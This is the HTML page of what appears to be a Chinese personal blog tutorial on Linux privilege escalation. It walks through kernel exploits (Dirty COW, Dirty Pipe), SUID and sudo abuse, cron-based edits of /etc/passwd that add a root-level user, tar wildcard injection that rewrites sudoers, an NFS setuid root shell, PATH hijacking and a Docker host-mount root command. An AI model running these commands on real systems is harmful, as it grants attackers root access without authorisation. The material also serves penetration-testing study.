@@ -1,0 +1,278 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Linux提权简单介绍 | fl0r's blog</title><meta name="author" content="fl0r"><meta name="copyright" content="fl0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Linux提权简介为什么我们要提权？ 由于通过服务或者上传webshell而进入服务器所配置的权限较低，导致操作的局限性很低。 提权的思路？ 大概思路是通过信息搜集查找可利用的文件&#x2F;脚本&#x2F;软件&#x2F;用户&#x2F;内核漏洞&#x2F;恶意劫持&#x2F;特定平台漏洞&#x2F;框架漏洞&#x2F;组件&#x2F;等，写入或执行恶意命令&#x2F;脚本&#x2F;shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权简单介绍">
+<meta property="og:url" content="https://florhack.github.io/2024/06/21/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="fl0r&#39;s blog">
+<meta property="og:description" content="Linux提权简介为什么我们要提权？ 由于通过服务或者上传webshell而进入服务器所配置的权限较低，导致操作的局限性很低。 提权的思路？ 大概思路是通过信息搜集查找可利用的文件&#x2F;脚本&#x2F;软件&#x2F;用户&#x2F;内核漏洞&#x2F;恶意劫持&#x2F;特定平台漏洞&#x2F;框架漏洞&#x2F;组件&#x2F;等，写入或执行恶意命令&#x2F;脚本&#x2F;shell">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://florhack.github.io/img/5.jpg">
+<meta property="article:published_time" content="2024-06-21T07:27:38.228Z">
+<meta property="article:modified_time" content="2024-06-21T07:30:15.025Z">
+<meta property="article:author" content="fl0r">
+<meta property="article:tag" content="-内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://florhack.github.io/img/5.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://florhack.github.io/2024/06/21/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Linux提权简单介绍',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-21 15:30:15'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/5.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="fl0r's blog"><span class="site-name">fl0r's blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Linux提权简单介绍</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-21T07:27:38.228Z" title="发表于 2024-06-21 15:27:38">2024-06-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-21T07:30:15.025Z" title="更新于 2024-06-21 15:30:15">2024-06-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Linux提权简单介绍"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为什么我们要提权？</p>
+<p>由于通过服务或者上传webshell而进入服务器所配置的权限较低，导致操作的局限性很低。</p>
+<p>提权的思路？</p>
+<p>大概思路是通过信息搜集查找可利用的文件&#x2F;脚本&#x2F;软件&#x2F;用户&#x2F;内核漏洞&#x2F;恶意劫持&#x2F;特定平台漏洞&#x2F;框架漏洞&#x2F;组件&#x2F;等，写入或执行恶意命令&#x2F;脚本&#x2F;shell&#x2F;添加高权限用户，提权成功，然后进一步利用。</p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>注意：内核提权的动静较大，可能会导致服务器崩溃</p>
+<p><strong>内核提权思路</strong></p>
+<ol>
+<li>获取关于目标系统的内核信息</li>
+<li>通过<code>exploit-db</code>或<code>searchsplopit</code>等工具搜索具体的内核版本信息</li>
+<li>通过<code>python3 -m http.server</code>或<code>wget</code>等服务将poc脚本传送至目标主机</li>
+<li>运行漏洞利用poc脚本（需要了解漏洞利用代码的工作原理，避免因为漏洞poc执行等原因对目标系统造成特殊的影响，或漏洞代码需要进行某些交互功能）</li>
+</ol>
+<h4 id="流行的工具"><a href="#流行的工具" class="headerlink" title="流行的工具"></a>流行的工具</h4><p>linux-exploit-suggester-2</p>
+<p>输出内核等信息，然后输出可能存在的漏洞，包括exp的下载地址，可以下载对应的exp来测试。有橙色标签的说明更符合目标机情况。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester-2</a></p>
+<p>下载脚本：<a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">linux-exploit-suggester</a></p>
+<p>如何找编译好的EXP</p>
+<p>这里提一下，之前在设计找EXP都是使用自动化进行编译，但是就会出现需要安装C语言环境，而如果目标靶机中没有C语言环境，如果你私自在别人的操作系统中去安装C语言环境，可能会导致服务器部分环境或服务产生问题，那么就需要在本地进行编译，在编译后好再上传。不过也较为麻烦，这里给几个github上编译好的环境。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lucyoa/kernel-exploits">kernel-exploits</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack">Unix-Privilege-Escalation-Exploits-Pack</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></p>
+<h4 id="流行的提权漏洞"><a href="#流行的提权漏洞" class="headerlink" title="流行的提权漏洞"></a>流行的提权漏洞</h4><p><strong>脏牛提权</strong></p>
+<p>漏洞信息：CVE-2016-5195漏洞</p>
+<p>影响范围：Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)</p>
+<p>漏洞EXP：<a target="_blank" rel="noopener" href="https://github.com/firefart/dirtycow/blob/master/dirty.c">https://github.com/firefart/dirtycow/blob/master/dirty.c</a><br><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。</p>
+<p>使用：.&#x2F;dirty  123456  ##执行，后面的123456是自定义的密码</p>
+<p>漏洞信息：CVE-2022-0847漏洞</p>
+<p>影响范围：Linux Kernel版本 &gt;&#x3D; 5.8</p>
+<p>Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102</p>
+<p>漏洞EXP：<a target="_blank" rel="noopener" href="https://github.com/r1is/CVE-2022-0847/blob/main/Dirty-Pipe.sh">https://github.com/r1is/CVE-2022-0847/blob/main/Dirty-Pipe.sh</a></p>
+<p>使用：.&#x2F;Dirty-Pipe.sh</p>
+<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>SUID (Set owner User ID up on execution) 是给予文件的一个特殊类型的文件权限。</p>
+<p>在 Linux&#x2F;Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序&#x2F;文件）所有者的权限来运行一个程序&#x2F;文件。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限。suid权限仅对二进制程序有效（binary program）(系统中的一些命令），不能用在脚本上（script）。执行者对于该程序需要具有x的可执行权限；本权限仅在执行该程序的过程中有效（run-time）；执行者将具有该程序拥有者的权限。</p>
+<p><strong>SUID提权思路</strong></p>
+<p>1、查找拥有SUID权限的程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>2、参照以下suid提权辅助平台进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gtfobins.github.io/</span><br></pre></td></tr></table></figure>
+
+<p><strong>补充</strong></p>
+<p>当我们实验时可以使用“chmod  u+s  progress_test”命令为文件配置SUID权限。</p>
+<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>主要是因为sudo权限滥用而导致的提权</p>
+<p><strong>SUID提权操作思路</strong></p>
+<p>1、使用sudo -l命令查看本用户允许使用的sudo程序</p>
+<p>2、参照以下suid提权辅助平台进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gtfobins.github.io/</span><br></pre></td></tr></table></figure>
+
+<p><strong>补充</strong></p>
+<p>当我们实验时可以新建普通用户sudo_test，而后切换到root用户，执行以下动作：</p>
+<p>添加文件的写权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+w /etc/sudoers；</span><br></pre></td></tr></table></figure>
+
+<p>向sudoer文件中添加以下内容（可按需增加）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo_test  ALL= (root) NOPASSWD: /usr/bin/find, (root) NOPASSWD: /usr/bin/vim,(root) NOPASSWD:/usr/bin/awk,(root) NOPASSWD:/usr/bin/man,(root) NOPASSWD:/usr/bin/less,(root) NOPASSWD:/bin/more,(root) NOPASSWD:/bin/tar,(root) NOPASSWD:/usr/bin/zip；</span><br></pre></td></tr></table></figure>
+
+<p>撤销文件的写权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u-w /etc/sudoers；</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h2><p>由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。</p>
+<p><strong>定时任务提权思路</strong></p>
+<p><em><strong>利用python文件</strong></em></p>
+<p>1、创建一个test.py的python文件，运行后passwd已经任意成员可写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> stat</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.chmod(<span class="string">&quot;/etc/passwd&quot;</span>,stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>2、修改crontab文件，将定时任务注册到系统中：vim &#x2F;etc&#x2F;crontab，在末尾加上表示每1分钟运行一次test.py。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 *  * * *  root   python  /home/test.py</span><br></pre></td></tr></table></figure>
+
+<p>3、使用perl语言生成带有盐值的密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -le ‘print crypt(“hack”,“addedsalt”)’</span><br></pre></td></tr></table></figure>
+
+<p>4、而后，拼接密码，将以下字符串写入&#x2F;etc&#x2F;passwd文件，之后便拥有了一个超级用户hack：hack。最后登入账户即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“hack:adCP9//qaScc2:0:0:User_like_root:/root:/bin/bash”</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>利用sh文件</strong></em></p>
+<p>1、查看root创建的计划任务，找到有修改权限的计划任务脚本；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l;done //遍历用户的cronjobs</span><br><span class="line"></span><br><span class="line">for u in `cat /etc/passwd | cut -d&quot;:&quot; -f1`;do crontab -l -u $u;done   //遍历用户的cronjobs</span><br><span class="line"></span><br><span class="line">find / -perm -2 -type f 2&gt; /dev/null		//通过find命令对可写文件的收集</span><br></pre></td></tr></table></figure>
+
+<p>2、通过通配符注入来修改脚本文件内容提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">echo &#x27;echo &quot;ocean ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#x27; &gt;test.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br><span class="line">tar cf archive.tar *</span><br><span class="line">//1分钟后</span><br><span class="line">sudo -i</span><br><span class="line">sudo bash</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p>3、-checkpoint-action&#x3D;exec&#x3D;sh test.sh参数的意思是执行同目录下test.sh文件，test.sh文件内容又是把 bin&#x2F;bash拷贝给&#x2F;tmp&#x2F;bash并给&#x2F;tmp&#x2F;bash赋SUID权限。此时我们再执行&#x2F;tmp&#x2F;bash就享有了suid权限，所以这里是一环套一环的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&quot; &gt; --checkpoint=1   </span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;   ##执行test.sh文件</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&#x27; &gt; test.sh  ##将/bin/bash复制到/tmp下，并提权SUID权限，同时将命令写入到test.sh脚本中</span><br><span class="line">chmod +x test.sh  ##赋予执行权限</span><br></pre></td></tr></table></figure>
+
+<p>4、获取root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bash -p</span><br></pre></td></tr></table></figure>
+
+<h2 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h2><p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=NFS&spm=1001.2101.3001.7020">NFS</a>（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。当该参数设置为no_root_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权。</p>
+<p><strong>NFS提权思路</strong></p>
+<p>1、首先在攻击机（kali）上安装nfs客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nfs-common</span><br></pre></td></tr></table></figure>
+
+<p>2、将攻击目标的共享目录挂载到本机目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/kali/Desktop/test：sudo mount 攻击目标IP:攻击目标目录  /home/kali/Desktop/test</span><br></pre></td></tr></table></figure>
+
+<p>3、在&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;test文件中写入一个C文件并编译后执行就提权了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">int main ()&#123;setuid(0);system(&quot;/bin/bash&quot;);return 0;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//gcc test.c -o test</span><br><span class="line"></span><br><span class="line">//chmod +s test</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><p>shell恰巧是SUID权限也就是root权限执行，根据这个命令将bash修改成对应的命令名称，同时添加环境变量，那么root权限去执行bash就能够进行提权。</p>
+<p>条件：本地用户</p>
+<p><strong>环境变量提权思路</strong></p>
+<p>假设有一段shell程序，调用ps命令，设置uid和gid为0是要使用root权限来执行后续的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从头添加环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">export PATH=路径:$PATH  ##从头添加</span><br><span class="line">export PATH=$PATH:路径  ##从尾添加</span><br><span class="line">如：</span><br><span class="line">export PATH=/tmp:$PATH </span><br><span class="line">echo $PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用第三方服务提权"><a href="#利用第三方服务提权" class="headerlink" title="利用第三方服务提权"></a>利用第三方服务提权</h2><h4 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h4><p>普通用户执行：即可获得root权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>由于本人太菜后续内容有待更新。。。。。。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://florhack.github.io">fl0r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://florhack.github.io/2024/06/21/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">https://florhack.github.io/2024/06/21/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://florhack.github.io" target="_blank">fl0r's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">-内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/24/%E6%BA%AF%E6%BA%90%E6%80%BB%E7%BB%93/" title="溯源思路总结"><img class="cover" src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">溯源思路总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">fl0r</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">阅读声明：纯技术分享，文章仅供参考，文中的知识或工具仅限于读者对自己所负责的网站、服务器等进行学习研究和授权测试，严禁用于一切未授权测试和非法测试，否则产生的一切后果自行承担，与本文作者无关！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E8%A1%8C%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">流行的工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E8%A1%8C%E7%9A%84%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">流行的提权漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">定时任务提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS%E6%8F%90%E6%9D%83"><span class="toc-number">1.6.</span> <span class="toc-text">NFS提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">环境变量提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.8.</span> <span class="toc-text">利用第三方服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker%E6%8F%90%E6%9D%83"><span class="toc-number">1.8.0.1.</span> <span class="toc-text">Docker提权</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" 